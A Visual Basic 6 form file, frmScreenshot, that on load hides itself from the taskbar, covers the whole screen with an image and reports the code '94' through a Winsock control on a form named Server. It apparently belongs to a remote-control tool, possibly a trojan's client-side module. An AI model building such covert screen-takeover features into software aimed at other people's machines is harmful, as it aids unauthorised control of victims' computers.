VERSION 5.00
Begin VB.Form frmScreenshot 
   BorderStyle     =   0  'Kein
   ClientHeight    =   3195
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4680
   Icon            =   "info.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'Bildschirmmitte
   Begin VB.Image Image1 
      Height          =   1215
      Left            =   0
      Top             =   0
      Width           =   1695
   End
End
Attribute VB_Name = "frmScreenshot"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Sub Form_Load()

    Me.Move 0, 0, Screen.Width, Screen.Height
    Image1.Picture = LoadPicture()
    screenshot = True
    Server.wsoWinsock.SendData ("94")

End Sub

Private Sub Image1_Click()

    Unload Me
    screenshot = False

End Sub
